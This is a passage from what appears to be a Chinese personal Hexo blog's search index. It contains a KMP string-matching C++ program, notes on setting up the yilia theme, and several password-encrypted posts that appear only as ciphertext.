		else std::cout &lt;&lt; &quot;rename error &quot;&lt;&lt; std::endl;
	&#125;
 	system(&quot;pause&quot;);
	return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/photo/%E5%88%87%E6%8D%A21.png"></p>
]]></content>
  </entry>
  <entry>
    <title>数据结构-两个栈实现队列</title>
    <url>/2020/10/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="37079a6eaefabf43d93932614d5b30e46708aa8aa73f1613ffd94e723f05f78e">9f09563916ba502db9c39b9d0e87160545758084d82ba5e51feea2e5c9a661c5b11168a90c9d90932db073bc27a7ad983692e2e8dba4cc53bc95061ea800b0b710dadb9c7ca639b3d163282f9a368dd9e7783f6469fbad9eaa74806a45fce4d8b8060f55d7e98a9364394f5413311b94a4272289d83150a28bf7f5fc2fa44aec35c6b2e06c00739d7608ade94870c16d8b5b91ec4690fb0bf2f54341417e1c250ae5082c64e5e50debfd131d77bfead690e38ee574d6dd0db1ee425e415aba2d09d5d79037ae4aa22322e4f3e9b3c52b0d16850f21f5d1b43d51bd9eecee96e488ae67893b80deb7b17e48975088f8023712d638436ae0f9a9767fdd536b60c3a90f042122b64b6681c0d2536e388a51c891887abe36397b3d024b4cfb0c7f1c698799257f4959a94b6cc7d698ed0368450d367c2a1b1f132b87529eaedca5f0a4c9708e462f07d5d40a2f16d1f6cfee228d89c1314d993b09fdcbd845057a0a04907d71d453e2deaaf0e5dbf7c0cb03355ff74deb6c67bef6d9e6135ff424d250ca185a2b04e9e2091638eaecaa9263f0c7860cdc2a26e5a561bd462b3351ed9ff7013fafb1499cce515d959558e8214d26d5b3a75a401fe0e7214e3a4286bc9ad60d7af95cfdb9584214776a3f57672f1ed31c550df1e67ebd6d60ec323082f305473647a2726714aa2d11b556a4464e71614187535759ac7702fa7393f8d912a37f14e7d93f6c9bc71df854107eb796fa964856a076d349ba87919f2771dcab206c38a1d4e72a083c0a531631ecf2190c73b8c004d32c1564ca1f910c8d3b6c11a804fe6054c0261a15fccdee6e6b07188b357c2b9026708c97ec0a00e9c039fcd468f088ab5f5abf7932feb3e4cad466e007e6648ace953651c747a3d508de36c0b8d509272e283e072d9f156b2028aff22da1110c79896deb527b035c56c11103262926d6f0e360023ce9adc429d8abc396b6d178da256087ed6c241759cd3c4547866b05ef26d0f9707ddc642c8fdb65365ebea65028cf05afb0eecde7b748764eb9fec9cd4adc86ba4118b971f81498e4636aee53d2eae7a361e601d15a652d5bfc11a5d8372c657258cae520844fd14a2a98d4e6f44cd78b5b58336afcb8259839ad476fa9ed795e4eff9f80b6fd8f37ddc66d3fc0d72aeb0cb7404fdb19558671a4ecaee112cf739f0cda980642e87467b2a3726a61248aed12283cc8935236fcfc581415e739464c9ef0f154f8c2c156e8c3d83ca59d6beb1c478331ced8f9d8facf345683173544677526abed35321a7828afc9f63f1159d10eb5def72002877ce26f2cce6861de96573a56ff204741cdfe74cab00354cb9d4f09adc9fa445c50295c4cb65c24c271ff6f00f6aeff5fd03f927f6e811748a5ac361f1751e4bd4ea61ba43ecc841c5f53088cb8190d385c868d060976f332d437b3aa951d15ab2e56f645ae4994fef2fb3a33f07bf28a32aa385377a1a01b5c0b205c0b3b45b461191f714b92430752f0b2359045fac29f1abeb338ada8119271aeb086e8e94d901e0d5bfe70a70cf625e2222053b24fdca21f38d4d161f34f874b9d2c9ad150bc50c51e62fd036b5eff3e9668d1ecc35962ca91dc358f1da85e6f22cf1f4b95cc5b0dacb29ab9e4bbb61a305cedc4f42ca4c68707d8c13f3d33f114b923bf0e1d3c354a2d0149b3521145092088db1d351c849975bca10fb7868ee5f04fa61e902868ffd4af765a2df296c107dcae86bfa10e0ece725ac8160e4528bbe5f710a57c380f968fff84b1386a3200376a1c006ec4c73b61a50a3c2d04e77830e224ba49da0f5bf22db5d6dadae0b5866e4b3a8e1a137ebf29db55e119550ecb149712771ebb1f1a47eef4c09b153ba786744c29e8fe3de2383dea980523bbd076ba2d51e656b6c6adf75ba6f983f990611224efa7d4322e2e0f5c7e99ae0587eda2581904b7854c9bbc9bf914c4eadf5bc9f4a98fb07b376108a7597ad1187b21c787703060819b086de6d9816ce7e764325bc7745e0babdfc8d0dfc8cf9e81870bac81291f75b3bb88d64120b15ba5f6cb5280ee595f05dd0a21eef7fd19dbe72b25747b4d40b87350b071ffcfecd0b1e4c119975bfda3fe977bbfc2affbcf244ef60f29aa2bdca863c9593e7ded42f01c4e7895fb6c7ff2dd5cd4b0cdcfb026868f0008bb3111271643d66976f390582b5910aed11b0469bdb37470b3a7c97fd9d2e4b84462379ab8f209a6214f89731c01b7526269518a64971b4cc0f724efb1a306f33a55ce8d0f1743137ea870cb0ea87444751dc61e34025e2b7fab80658fec18846347af8507586552191377de0de44561c96d0017c7b4e27ff445599853d4d40cae1eaaec825fd4ecd28cafb2d11f40898c0210b9f8482d07d21155cd60babe9d73115bb47826750f2656f5ccaf458d1ccc0b78991c4d251aa27e91f58dc8f24af0cc28a5339b41031581cf889e101074ec39922e3d5c03c672ebb1986e5e287d4a5bf717db85e97d9810bd1dc0b3032eebb156674b1a0bdb55329a18157a700a849ffa0b7405984f189f8522cf76b2714eed7dafc74eb70b99b99607f241dd38a56be903d0e4b279e481a85f93d3c9f4b4053986f8ff26a352c0c1a0343582315ee938e43de21da898dbdcfe59a9a71bc7e2e2bc3ceb1149be1b11229e4cd1aaa733595666f757c1c22ab14d2e1a1ab5b423d5d4a6784cd72fb81f1f96b67ae059c2f6e15176f8c9cd5043707ab2f9f9260567b2f0d444e1293802cae2ab260fd12acb2b80ae491191e3e683b12e09ec0b537e60d7e902f3431cb55972798019814585387c9f1ab2e3ab578bc59fd68d2ca15835139b8594a93754c106ee472bb3c0c9a690e3124675347f5e15c823340217b4d85f7db61cc9e130988f3d66e7fac6c786c043e0aaf33b0070a7bd60124f28663662cdc49d8fe93dbb4d06ba9ca9e75f6192373cc279278a574e9abf7f00767d03610fd42b0132e9e921c6d3b8f2a9bc67ee7ccb0bb3193f286d2d6c2ae784af2cdd8937e5717cb088bd80a6d013c3d38361baf94e92d58c5ff779a71a266404486f9647adab0f1b7b486c9659da302f7828751484</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>矩阵压缩题</title>
    <url>/2020/10/11/%E7%9F%A9%E9%98%B5%E5%8E%8B%E7%BC%A9%E9%A2%98/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="cac17b9a8bd6aefd3003f6b2e50913ca19e8d50552666a47e48e50f4593af46f">792c9c1b44317d0bf620b965b9351c1e784f8d7dbc21f72488e9660f2ad9f57fc52946d53b04dd2b5eb1e348581791950f6c9b1da48db4e4a18ea8968314d6372d0aa9bef31d12369e2e4ca4633dd524</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>KMP算法</title>
    <url>/2020/10/11/KMP%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<ul>
<li>第三次更新</li>
</ul>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;
#include&lt;cstring&gt;
#include&lt;stdlib.h&gt;
using namespace std;
int next[15]&#x3D;&#123;-1&#125;;
void getnext(char t[])
&#123;
	int j,i,k,n,m;
	m&#x3D;strlen(t);
	j&#x3D;0;k&#x3D;-1;
	while(j&lt;m-1)
	&#123;
		if(k&#x3D;&#x3D;-1||t[j]&#x3D;&#x3D;t[k])
		&#123;
			j++;
			k++;
			next[j]&#x3D;k;
		&#125;
		else k&#x3D;next[k];
	&#125;
	for(i&#x3D;0;i&lt;m;i++)
	cout&lt;&lt;next[i]&lt;&lt;&#39; &#39;;
	cout&lt;&lt;endl;
&#125;
int KMPmatching(char *s,char *t)
&#123;
	int i,j;
	i&#x3D;0;
	j&#x3D;0;
	int m,n;
	m&#x3D;strlen(s);
	n&#x3D;strlen(t);
	while(i&lt;m&amp;&amp;j&lt;n)
	&#123;
		if(j&#x3D;&#x3D;-1||s[i]&#x3D;&#x3D;t[j])
		&#123;
			i++;
			j++;
		&#125;
		else j&#x3D;next[j];
	&#125;
	if(j&gt;&#x3D;n) return i-n;
	else return -1;
&#125;


int main()
&#123;
	char a[20]&#x3D;&quot;abcaababc&quot;;
	char b[20]&#x3D;&quot;aba&quot;;
	getnext(b);
	cout&lt;&lt;KMPmatching(a,b);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>准备更新评论功能</title>
    <url>/2020/10/11/%E5%87%86%E5%A4%87%E6%9B%B4%E6%96%B0%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<h2 id="昨天搞了一天，今天先放放，这东西的错误稀奇古怪，找个错误都要半天，不好整"><a href="#昨天搞了一天，今天先放放，这东西的错误稀奇古怪，找个错误都要半天，不好整" class="headerlink" title="昨天搞了一天，今天先放放，这东西的错误稀奇古怪，找个错误都要半天，不好整"></a>昨天搞了一天，今天先放放，这东西的错误稀奇古怪，找个错误都要半天，不好整</h2><blockquote>
<ul>
<li>计划把评论功能整上</li>
<li>还有分类功能</li>
<li>分登录评论和匿名评论</li>
<li>文章字数统计，和阅读用时功能</li>
</ul>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>测试音乐-头号玩家主题歌</title>
    <url>/2020/10/10/%E6%B5%8B%E8%AF%95%E9%9F%B3%E4%B9%90-%E5%A4%B4%E5%8F%B7%E7%8E%A9%E5%AE%B6%E4%B8%BB%E9%A2%98%E6%AD%8C/</url>
    <content><![CDATA[<blockquote>
<ul>
<li>网易云音乐<br>网易云音乐是一款由网易开发的音乐产品，是网易杭州研究院的成果，依托专业音乐人、DJ、好友推荐及社交功能，在线音乐服务主打歌单、社交、大牌推荐和音乐指纹，以歌单、DJ节目、社交、地理位置为核心要素，主打发现和分享。<br>该产品2013年4月23日正式发布，截止2017年04月，产品已经包括iPhone、Android、Web、Windows、iPad、WP8、Mac、Win10UWP、Linux等九大平台客户端。2015年1月16日，网易云音乐荣膺百度中国好应用“年度优秀视觉设计奖”。<br>2018年2月9日，网易云音乐与腾讯音乐达成版权互授合作。3月6日，网易云音乐与阿里音乐达成版权互授合作。4月5日，腾讯音乐娱乐集团发表声明称，暂停与网易云音乐的转授权合作洽谈。<br>2019年6月11日，网易云音乐入选“2019福布斯中国最具创新力企业榜”。9月6日，阿里巴巴作为领投方，领投网易云音乐7亿美元融资。<br>2020年8月，网易云音乐以200亿元人民币市值位列《苏州高新区·2020胡润全球独角兽榜》第108位。</li>
</ul>
</blockquote>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=530 height=86 src="//music.163.com/outchain/player?type=2&id=26192183&auto=0&height=66"></iframe>]]></content>
  </entry>
  <entry>
    <title>完善搭建</title>
    <url>/2020/10/10/%E5%AE%8C%E5%96%84%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h4 id="Hexo-yilia-主题一揽子使用方案"><a href="#Hexo-yilia-主题一揽子使用方案" class="headerlink" title="Hexo yilia 主题一揽子使用方案"></a>Hexo yilia 主题一揽子使用方案</h4><p>在用 Hexo 搭建完毕后，接着就寻找主题了，对比了几个主题 ，发现这个yilia 主题比较干净，简洁，于是就选了这个主题，但是有些细节不太习惯，于是就研究调整了一下，就是现在这个博客的样子。</p>
<a id="more"></a>
<blockquote>
<ul>
<li>原链接:<a href="https://www.liuyun.fun/2018/04/07/Hexo_yilia_%E4%B8%BB%E9%A2%98%E4%B8%80%E6%8F%BD%E5%AD%90%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/">https://www.liuyun.fun/2018/04/07/Hexo_yilia_主题一揽子优化方案/</a></li>
</ul>
</blockquote>
<h4 id="查看所有文件，提示缺失模块"><a href="#查看所有文件，提示缺失模块" class="headerlink" title="查看所有文件，提示缺失模块"></a>查看所有文件，提示缺失模块</h4><p>yilia 在首次使用时，点击所有文章 时，会出现模块找不到的错误，可按照提示操作即可<br>注意一下，_config.yml 路径是指 根目录下的，而非 yilia 主题下的 config文件</p>
<h4 id="配置图片资源"><a href="#配置图片资源" class="headerlink" title="配置图片资源"></a>配置图片资源</h4><p>添加图片资源文件夹。 路径为 themes/yilia/source/下，可添加一个 assets 文件夹，里面存放图片资源即可<br>配置文件中直接引用即可。路径为 themes/yilia/_config.yml，找到如下即可</p>
<h1 id="微信二维码图片"><a href="#微信二维码图片" class="headerlink" title="微信二维码图片"></a>微信二维码图片</h1><p>weixin:  /assets/img/wechat.png</p>
<h1 id="头像图片"><a href="#头像图片" class="headerlink" title="头像图片"></a>头像图片</h1><p>avatar:  /assets/img/head.jpg</p>
<h1 id="网页图标"><a href="#网页图标" class="headerlink" title="网页图标"></a>网页图标</h1><p>favicon:  /assets/img/head.jpg</p>
<h4 id="文章如何显示摘要"><a href="#文章如何显示摘要" class="headerlink" title="文章如何显示摘要"></a>文章如何显示摘要</h4><p>问题。点击主页时，发现所有文章都是全文显示，不利于查找，可控制显示的字数<br>解决办法。 在你 MD 格式文章正文插入 <!-- more -->即可，只会显示它之前的，此后的就不显示，点击文章标题，全文阅读才可看到，同时注释掉以下 themes/yilia/_config.yml，重复</p>
<p>1</p>
<h1 id="excerpt-link-more"><a href="#excerpt-link-more" class="headerlink" title="excerpt_link: more"></a>excerpt_link: more</h1><p>效果</p>
<h4 id="文章显示目录"><a href="#文章显示目录" class="headerlink" title="文章显示目录"></a>文章显示目录</h4><p>增加文章目录 TOC(table of content )，方便阅读文章, 在 themes/yilia/_config.ym中进行配置 toc: 2即可，它会将你 Markdown 语法的标题，生成目录，目录查看在右下角。</p>
<h4 id="增加归档菜单"><a href="#增加归档菜单" class="headerlink" title="增加归档菜单"></a>增加归档菜单</h4><h4 id="修改-themes-yilia-config-yml"><a href="#修改-themes-yilia-config-yml" class="headerlink" title="修改 themes/yilia/_config.yml"></a>修改 themes/yilia/_config.yml</h4><p>1<br>2<br>3<br>menu:<br>    主页:  /<br>    归档:  /archives/index.html</p>
<h4 id="修改代码块样式"><a href="#修改代码块样式" class="headerlink" title="修改代码块样式"></a>修改代码块样式</h4><p>默认的代码样式太刺眼了，调成稍微柔和一些的，这里是调成 Atom 风格，以下为两种方式都可以，推荐第一种直接修改编译好的文件，不然还需要重新build。</p>
<p>直接修改编译好的文件。路径为： theme\yilia\source\main.0cf68a.css</p>
<p>修改代码背景色，搜索 .article-entry .highlight, 修改background后面的颜色</p>
<p>修改代码字体颜色 .article-entry .highlight .line</p>
<p>修改源文件重新build。上述资源对应源文件为 yilia\source-src\css\highlight.scss，按照如下方式build<br>1<br>2<br>3<br>4<br>cd 到 yilia 目录下<br>npm install<br>npm run dev<br>npm run dist</p>
<h4 id="增加不蒜子统计"><a href="#增加不蒜子统计" class="headerlink" title="增加不蒜子统计"></a>增加不蒜子统计</h4><p>利用这个统计，可以知道你博客的访问量</p>
<h4 id="安装不蒜子脚本"><a href="#安装不蒜子脚本" class="headerlink" title="安装不蒜子脚本"></a>安装不蒜子脚本</h4><p>udpate: 2019/9/15</p>
<p>在 themes\yilia\layout_partial\after-footer.ejs最后添加，注意以下新的域名才有效，老的已经失效了</p>
<p>1<br>2</p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
<p>添加统计网站访问量<br>修改 themes\yilia\layout_partial\footer.ejs，包括访客数和站点访问总量</p>
<p>1<br>2<br>3<br>4<br>5</p>
<h1 id="PV方式，单个用户连续点击-n-篇，记录-n-次记录值"><a href="#PV方式，单个用户连续点击-n-篇，记录-n-次记录值" class="headerlink" title="PV方式，单个用户连续点击 n 篇，记录 n 次记录值"></a>PV方式，单个用户连续点击 n 篇，记录 n 次记录值</h1><p><span id="busuanzi_container_site_pv">    本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<h1 id="UV方式，单个用户连续点击-n-篇，记录-1-次记录值"><a href="#UV方式，单个用户连续点击-n-篇，记录-1-次记录值" class="headerlink" title="UV方式，单个用户连续点击 n 篇，记录 1 次记录值"></a>UV方式，单个用户连续点击 n 篇，记录 1 次记录值</h1><p><span id="busuanzi_container_site_uv">  本站访客数<span id="busuanzi_value_site_uv"></span>人次</span></p>
<h4 id="单篇文章点击量"><a href="#单篇文章点击量" class="headerlink" title="单篇文章点击量"></a>单篇文章点击量</h4><p>themes\yilia\ ayout_partial\article.ejs中 在 &lt;%- partial(‘post/title’, {class_name: ‘article-title’}) %&gt; 插入如下代码<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10</p>
<!--显示阅读次数-->
<p>&lt;% if (!index &amp;&amp; post.comments){ %&gt;<br>  <br/><br>  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;"><br>  <span class="icon-sort"></span><br>  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;"><br>            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;<br>  </span><br>  </a><br>  &lt;% } %&gt;</p>
<h4 id="添加来必力评论系统"><a href="#添加来必力评论系统" class="headerlink" title="添加来必力评论系统"></a>添加来必力评论系统</h4><p>点击这个链接 查看</p>
<p>添加版权信息<br>点击这个链接 查看</p>
<p>插入网易云音乐<br>登入网易云音乐网页版，选择一首歌，点击歌曲详情，点击生成外链播放器</p>
<p>复制外链代码，插入你需要编辑的 MD 格式文章里面，即可</p>
<h4 id="百度-Google统计-SEO"><a href="#百度-Google统计-SEO" class="headerlink" title="百度/Google统计/SEO"></a>百度/Google统计/SEO</h4><p>点击这个链接查看，这几项都是相同的</p>
<h4 id="七牛云图床"><a href="#七牛云图床" class="headerlink" title="七牛云图床"></a>七牛云图床</h4><p>博客内容最麻烦的就是插入图片，我们可以使用七牛云提供的 10G 的免费存储空间，将图片上传上去，然后生成外链，使用 Markdown 的图片引用方法即可，这样文章就脱离了图片编辑，转为在线了。同样一份文章，你部署在 csdn 等其他网页时，直接复制粘贴即可。</p>
<h4 id="上传图片到七牛云"><a href="#上传图片到七牛云" class="headerlink" title="上传图片到七牛云"></a>上传图片到七牛云</h4><p>注册，并完成支付宝实名认证，实名认证后有10G的免费空间，认证免费额度</p>
<p>添加文件。步骤为添加 对象存储, 新建一个存储空间，进入到该空间，点击 内容管理,点击上传文件</p>
<h4 id="生成外链插入到文章中"><a href="#生成外链插入到文章中" class="headerlink" title="生成外链插入到文章中"></a>生成外链插入到文章中</h4><p>使用 PicGo 自动生成外链<br>但是这样通过 web点击上传按钮方式，太效率了，这里使用 PicGo 工具，完成拖动自动生成外链，感谢作者。</p>
<h4 id="查看你的七牛密钥。登入七牛云查看密钥-个人面板-gt-密钥管理"><a href="#查看你的七牛密钥。登入七牛云查看密钥-个人面板-gt-密钥管理" class="headerlink" title="查看你的七牛密钥。登入七牛云查看密钥 个人面板 -&gt; 密钥管理"></a>查看你的七牛密钥。登入七牛云查看密钥 个人面板 -&gt; 密钥管理</h4><p>PicGo 配置七牛账户。然后就在上传图，拖动图片进去，即可生成外链，直接插入到文章中即可。</p>
<h4 id="Demo测试"><a href="#Demo测试" class="headerlink" title="Demo测试"></a>Demo测试</h4><p>修改配置后，输入以下三条命令即可部署</p>
<p>1<br>2<br>3<br>hexo clean<br>hexo g<br>hexo d</p>
]]></content>
  </entry>
  <entry>
    <title>源代码</title>
    <url>/2020/10/10/%E6%BA%90%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<blockquote>
<ul>
<li>源码在这：<a href="https://github.com/lhl1/lhl1.github.io">https://github.com/lhl1/lhl1.github.io</a></li>
</ul>
</blockquote>
<h3 id="拿去随便用"><a href="#拿去随便用" class="headerlink" title="拿去随便用"></a>拿去随便用</h3>]]></content>
  </entry>
  <entry>
    <title>咋这慢？？？</title>
    <url>/2020/10/10/%E5%92%8B%E8%BF%99%E6%85%A2%EF%BC%9F%EF%BC%9F%EF%BC%9F/</url>
    <content><![CDATA[<h3 id="这github是真的慢-这域名怕是要买一手了"><a href="#这github是真的慢-这域名怕是要买一手了" class="headerlink" title="这github是真的慢,这域名怕是要买一手了"></a>这github是真的慢,这域名怕是要买一手了</h3>]]></content>
  </entry>
  <entry>
    <title>CMD</title>
    <url>/2010/10/12/%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="b740cfc80377a09cc72720f1c2127a1f2705cc5047fc41b9a2a40b439de2483e">d4155f2e349f5b8b303096873299bda71c5f872025d3fcbf90fe8dc10fe11cba8db02d9f32763d2016f2091a1503def315b5df2d4eb6348fb24ea40b45ec5af5f6f61a300cb4651d5810f27648551562ebd330614f0c19abd4d7d15ffda7d61f5ee0b2c529f281018e020523a7e612c86d49be6fdf76d2b7cd2fb708462cb5464ee4427d196288de2a2efa86d9e63818e6c1a9479f1e88f022ccabded7171e118a986b3385243c64126330bf4a8cf55a15cb46b73882ff0da65d4cae6b2b17c1febd3c6e718c94ad416b066b5dadbac0c8a5ae4c6a039f30c40459d44028dac501f75f5c31da997f9a4268d37764c359182fd0de3fc9993db887ac0a65db897edaf7fdefe60085dd490958e019ecb95463cac47b399098ed1a832e0ceb0b03fd3001cc47efde03808ad65091fa30af33</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
</search>
